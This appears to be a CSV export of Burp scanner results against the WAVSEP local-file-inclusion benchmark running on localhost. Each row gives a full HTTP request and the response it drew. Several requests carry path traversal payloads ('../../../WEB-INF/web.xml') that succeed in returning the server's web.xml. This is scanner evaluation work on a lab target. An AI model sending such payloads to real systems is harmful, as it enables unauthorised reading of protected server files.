http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case46-LFI-ContextStream-FilenameContext-BackslashTraversalValidation-OSPath-DefaultFullInput-AnyPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case46-LFI-ContextStream-FilenameContext-BackslashTraversalValidation-OSPath-DefaultFullInput-AnyPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 77
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case46-LFI-ContextStream-FilenameContext-BackslashTraversalValidation-OSPath-DefaultFullInput-AnyPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%2factive%2fLFI%2fLFI-Detection-Evaluation-POST-200Error%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:39 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case57-LFI-FileClass-FilenameContext-UnixTraversalRemoval-OSPath-DefaultFullInput-SlashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case57-LFI-FileClass-FilenameContext-UnixTraversalRemoval-OSPath-DefaultFullInput-SlashPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 21
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case57-LFI-FileClass-FilenameContext-UnixTraversalRemoval-OSPath-DefaultFullInput-SlashPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%2f.%2fdefault.txt","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:41 GMT
Connection: close
Content-Length: 5
12345"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Identical/Case19-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-SlashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Identical/Case19-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-SlashPathReq-Read.jsp?target=.%2f HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Identical/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:04:39 GMT
Connection: close
Content-Length: 1673

<!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"" ""http://www.w3.org/TR/html4/loose.dtd"">
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=ISO-8859-1"">
<title>Local File Inclusion Test Case</title>
</head>
<body>

	















<B>File delimiter: </B>/<BR>
<B>Line delimiter (encoded): </B>&#38;&#35;10&#59;<BR>
<B>User Directory Path (Absolute): </B>/usr/local/tomcat<BR>
<B>Deployment Path Root (Absolute): </B>/usr/local/tomcat/webapps/wavsep/<BR>
<B>Depl [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case21-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case21-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 21
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case21-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%5c.%5cdefault.txt","HTTP/1.1 302 
Location: MissingResource.html
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 0
Date: Tue, 23 Apr 2024 14:06:25 GMT
Connection: close
"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case62-LFI-ContextStream-FilenameContext-BackslashTraversalRemoval-OSPath-DefaultFullInput-AnyPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case62-LFI-ContextStream-FilenameContext-BackslashTraversalRemoval-OSPath-DefaultFullInput-AnyPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 80
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case62-LFI-ContextStream-FilenameContext-BackslashTraversalRemoval-OSPath-DefaultFullInput-AnyPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%2factive%2fLFI%2fLFI-Detection-Evaluation-POST-302Redirect%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:06:36 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/Case57-LFI-FileClass-FilenameContext-UnixTraversalRemoval-OSPath-DefaultFullInput-SlashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/Case57-LFI-FileClass-FilenameContext-UnixTraversalRemoval-OSPath-DefaultFullInput-SlashPathReq-Read.jsp?target=%2f.%2fdefault.txt HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:08:34 GMT
Connection: close
Content-Length: 5
12345"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Identical/Case10-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultFullInput-NoPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Identical/Case10-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultFullInput-NoPathReq-Read.jsp?target=..%2f..%2f..%2fWEB-INF%2fweb.xml HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Identical/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:04:37 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Valid/Case52-LFI-ContextStream-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Valid/Case52-LFI-ContextStream-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 21
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Valid/Case52-LFI-ContextStream-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=..%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:06:16 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case12-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultInvalidInput-NoPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case12-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultInvalidInput-NoPathReq-Read.jsp?target=..%2f..%2f..%2fWEB-INF%2fweb.xml HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:06:41 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Valid/Case67-LFI-ContextStream-FilenameContext-UnixTraversalRemoval-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Valid/Case67-LFI-ContextStream-FilenameContext-UnixTraversalRemoval-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp?target=%2f.%2fdefault.txt HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Valid/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:09:35 GMT
Connection: close
Content-Length: 5
12345"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case44-LFI-FileClass-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case44-LFI-FileClass-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 21
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case44-LFI-FileClass-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%5c.%5cdefault.txt","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:20 GMT
Connection: close
Content-Length: 1729

<!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"" ""http://www.w3.org/TR/html4/loose.dtd"">
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=ISO-8859-1"">
<title>Local File Inclusion Test Case</title>
</head>
<body>

	















<B>File delimiter: </B>/<BR>
<B>Line delimiter (encoded): </B>&#38;&#35;10&#59;<BR>
<B>User Directory Path (Absolute): </B>/usr/local/tomcat<BR>
<B>Deployment Path Root (Absolute): </B>/usr/local/tomcat/webapps/wavsep/<BR>
<B>Depl [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case39-LFI-FileClass-FilenameContext-UnixTraversalValidation-OSPath-DefaultFullInput-NoPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case39-LFI-FileClass-FilenameContext-UnixTraversalValidation-OSPath-DefaultFullInput-NoPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 18
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case39-LFI-FileClass-FilenameContext-UnixTraversalValidation-OSPath-DefaultFullInput-NoPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=.%2fdefault.txt","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:19 GMT
Connection: close
Content-Length: 5
12345"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case01-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultFullInput-AnyPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case01-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultFullInput-AnyPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 123
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case01-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultFullInput-AnyPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%2fusr%2flocal%2ftomcat%2fwebapps%2fwavsep%2factive%2fLFI%2fLFI-Detection-Evaluation-POST-200Identical%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:09 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
